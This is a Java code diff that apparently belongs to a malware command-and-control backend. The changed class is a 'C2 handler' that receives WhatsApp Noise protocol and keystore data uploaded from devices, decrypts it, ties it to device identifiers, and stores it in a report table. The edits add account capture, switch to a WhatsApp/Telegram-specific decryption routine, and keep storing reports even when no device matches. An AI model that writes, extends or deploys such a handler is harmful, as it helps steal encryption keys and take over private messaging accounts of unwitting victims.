@@ -12,7 +12,7 @@ import com.consume.service.C2HandlerContext;
 
 /**
  * POST /api/wp/t：WhatsApp Noise/keystore 上报。
- * <p>解密 → 设备关联（ecid/unique/serial + channel）→ wp_report 入库。
+ * <p>解密（wp/tg 专用，对齐 encryptAck）→ 设备关联（ecid/unique/serial + channel）→ wp_report 入库。
  */
 @Component
 public class HandleWpT extends AbstractC2Handler {
@@ -33,8 +33,16 @@ public class HandleWpT extends AbstractC2Handler {
             return;
         }
         resolveDomain(ctx);
-        String plain = decrypt(ctx, "ecid", "unique", "serial", "channel", "userId", "phoneId");
+        String plain = decryptWpTg(ctx, "ecid", "unique", "serial", "channel", "userId", "phoneId", "account");
         JSONObject pt = ctx.getPlaintext();
+        if (plain != null && !plain.isEmpty()) {
+            String dump = ctx.getRawText();
+            if (dump == null || dump.isEmpty()) {
+                dump = plain;
+            }
+//            log.info("正常日志:[c2_handlers] /api/wp/t 解密明文完整内容, id={}, len={}, plaintext={}",
+//                    ctx.getRecordId(), dump.length(), dump);
+        }
 
         String ecid = first(pt, "ecid", "d", "f");
         String unique = first(pt, "unique", "u");
@@ -51,10 +59,11 @@ public class HandleWpT extends AbstractC2Handler {
 
         store.saveWpReport(ctx, pt);
         if (plain == null || plain.isEmpty()) {
-            log.info("异常日志:[c2_handlers] /api/wp/t 解密失败或无明文, id={}", ctx.getRecordId());
+            log.info("异常日志:[c2_handlers] /api/wp/t 解密失败或无明文, id={}, err={}",
+                    ctx.getRecordId(), ctx.getDecryptError());
         } else if (rowId == null) {
-            log.info("异常日志:[c2_handlers] /api/wp/t 无设备，已尽力写库/跳过, id={}, ecid={}",
-                    ctx.getRecordId(), ecid);
+            log.info("正常日志:[c2_handlers] /api/wp/t 无设备，仍写入 wp_report, id={}, account={}",
+                    ctx.getRecordId(), first(pt, "account", "phoneId", "userId"));
         }
         log.debug("正常日志:[c2_handlers] handle_wp_t 完成, id={}, rowId={}, decryptOk={}",
                 ctx.getRecordId(), ctx.getDeviceRowId(), ctx.isDecryptOk());
